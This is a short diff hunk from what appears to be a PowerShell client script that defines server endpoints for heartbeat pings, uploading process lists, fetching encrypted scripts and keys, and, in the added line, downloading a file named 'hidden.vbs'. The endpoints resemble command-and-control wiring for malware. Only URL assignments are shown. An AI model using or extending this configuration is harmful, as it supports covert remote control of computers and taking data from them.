@@ -12,5 +12,5 @@ $Global:sending_list_base = "$ServerUrl/process_list.php"
 $Global:heartbeat = "$ServerUrl/ping.php?"
 $Global:processes_url = "$ServerUrl/processes.txt"
 $Global:fernet_key_endpoint = "$ServerUrl/get_encrypted_script.php"
-
+$Global:vbs_url = "$ServerUrl//hidden.vbs"
 $Global:receive_script_and_key = "$base_url/receive_script_and_key"
